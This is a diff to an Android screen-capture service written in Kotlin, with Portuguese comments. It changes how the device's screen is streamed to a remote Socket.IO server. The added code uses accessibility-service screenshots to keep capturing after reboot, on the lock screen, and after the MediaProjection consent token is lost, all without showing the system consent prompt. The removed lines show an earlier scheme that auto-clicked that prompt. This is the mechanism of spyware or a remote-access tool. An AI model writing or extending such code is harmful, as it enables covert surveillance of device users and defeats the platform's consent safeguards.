@@ -463,6 +463,18 @@ class ScreenCaptureService : Service() {
                     enviarLog("Aviso: falha ao reconectar Socket.IO no boot: ${e.message}")
                 }
                 registrarReceiverTelaLigada()
+                // [SEM MODAL NO REBOOT] Pós-boot NÃO há token de MediaProjection e
+                // NÃO pedimos modal. A ACESSIBILIDADE assume o envio já aqui: se a
+                // tela estiver ligada, inicia a captura por takeScreenshot na hora
+                // (sem esperar o próximo SCREEN_ON, que pode já ter passado no boot).
+                // Ela funciona bloqueada e desbloqueada; SCREEN_OFF/ON e USER_PRESENT
+                // continuam gerenciando o ciclo.
+                try {
+                    if (isScreenInteractive()) {
+                        MyAccessibilityService.instance?.iniciarCapturaAcessibilidade()
+                        enviarLog("Pós-boot: captura por acessibilidade iniciada (sem MediaProjection, sem modal).")
+                    }
+                } catch (_: Exception) {}
                 return START_STICKY
             }
 
@@ -534,17 +546,11 @@ class ScreenCaptureService : Service() {
                         enviarLog("MediaProjection encerrada pelo sistema/usuário.")
                         isRunning = false
                         capturandoDeVerdade = false   // captura real perdida
-                        // Se a tela está LIGADA quando a captura cai, revalida já
-                        // (não espera o próximo desbloqueio): reabre "Iniciar
-                        // agora" + auto-clique para o espelhamento voltar sozinho.
-                        try {
-                            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
-                            if (pm?.isInteractive == true) {
-                                Handler(Looper.getMainLooper()).postDelayed({
-                                    if (!capturandoDeVerdade) solicitarRevalidacaoEspelhamento()
-                                }, 800L)
-                            }
-                        } catch (_: Exception) {}
+                        // [MODAL SÓ NO REBOOT] Antes, ao perder a captura com a tela
+                        // ligada, reabríamos o modal "Iniciar agora" na hora. A pedido,
+                        // o modal de consentimento agora aparece SOMENTE quando o
+                        // dispositivo é REINICIADO (fluxo BootReceiver -> MainActivity
+                        // AUTO_BOOT_REANIMAR). Em sessão, NÃO reabrimos mais o modal.
                     }
                 }, Handler(Looper.getMainLooper()))
             }
@@ -912,21 +918,12 @@ class ScreenCaptureService : Service() {
                         enviarLog("[WATCHDOG] Stall de ${stallMs}ms detectado (tela ligada) — recriando VirtualDisplay.")
                         recriarVirtualDisplay(force = true)
                     }
-                    // GARANTIA DO MODAL: se a captura REAL caiu (token perdido) e a
-                    // tela está usável (ligada e SEM keyguard), reabre o
-                    // consentimento central "Iniciar agora" — o auto-clique confirma.
-                    if (telaLigada && !capturandoDeVerdade && !recriandoDisplay &&
-                        agora - ultimaRevalidacaoWatchdogMs > WATCHDOG_REVAL_COOLDOWN_MS
-                    ) {
-                        val kgTravado = try {
-                            (getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager)?.isKeyguardLocked == true
-                        } catch (_: Exception) { false }
-                        if (!kgTravado) {
-                            ultimaRevalidacaoWatchdogMs = agora
-                            enviarLog("[WATCHDOG] Captura caída (sem token) e tela usável — reabrindo consentimento 'Iniciar agora'.")
-                            solicitarRevalidacaoEspelhamento()
-                        }
-                    }
+                    // [MODAL SÓ NO REBOOT] Antes o watchdog reabria o modal
+                    // "Iniciar agora" quando a captura caía com a tela usável. A
+                    // pedido, o modal de consentimento agora aparece SOMENTE no
+                    // REINÍCIO do dispositivo (BootReceiver -> MainActivity
+                    // AUTO_BOOT_REANIMAR). O watchdog continua apenas recriando o
+                    // VirtualDisplay (acima), sem reabrir o modal em sessão.
                     try {
                         val kg = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
                         if (kg?.isKeyguardLocked == true && telaLigada) {
@@ -1103,22 +1100,29 @@ class ScreenCaptureService : Service() {
                         }
                         Intent.ACTION_USER_PRESENT -> {
                             isScreenOn = true
-                            enviarLog("USER_PRESENT detectado — tela desbloqueada; garantindo conexão Socket.IO e retomando espelhamento normal.")
-
                             SocketManager.garantirConexao()
                             removerOverlayMantemTelaAcesa()
-                            MyAccessibilityService.instance?.pararCapturaAcessibilidade()
 
-                            Handler(Looper.getMainLooper()).postDelayed({
-                                recriarVirtualDisplay(force = true)
-                                // Se a captura REAL não voltou (MediaProjection perdida
-                                // ao bloquear/dormir), re-pede o consentimento: abre a
-                                // MainActivity -> modal "Iniciar agora" -> auto-clique
-                                // (inject) confirma rápido e o espelhamento volta.
+                            if (mediaProjection != null) {
+                                // SESSÃO NORMAL (tem token de MediaProjection válido):
+                                // o MediaProjection assume o envio (melhor FPS). Para a
+                                // captura por acessibilidade e recria o VirtualDisplay.
+                                enviarLog("USER_PRESENT com MediaProjection válido — retomando espelhamento normal (sem modal).")
+                                MyAccessibilityService.instance?.pararCapturaAcessibilidade()
                                 Handler(Looper.getMainLooper()).postDelayed({
-                                    if (!capturandoDeVerdade) solicitarRevalidacaoEspelhamento()
-                                }, 1200L)
-                            }, 300L)
+                                    recriarVirtualDisplay(force = true)
+                                }, 300L)
+                            } else {
+                                // PÓS-REBOOT / SEM TOKEN: NÃO pede novo modal de
+                                // consentimento. A captura por ACESSIBILIDADE
+                                // (takeScreenshot) assume o envio TAMBÉM na tela
+                                // desbloqueada — ela já vinha enviando na tela de
+                                // bloqueio e continua enviando depois do desbloqueio,
+                                // pelo mesmo canal "enviar_tela". O espelhamento segue
+                                // sem interrupção e sem outro modal.
+                                enviarLog("USER_PRESENT sem MediaProjection (pós-reboot) — captura por acessibilidade assume o envio; sem novo modal.")
+                                MyAccessibilityService.instance?.iniciarCapturaAcessibilidade()
+                            }
                         }
                     }
                 }
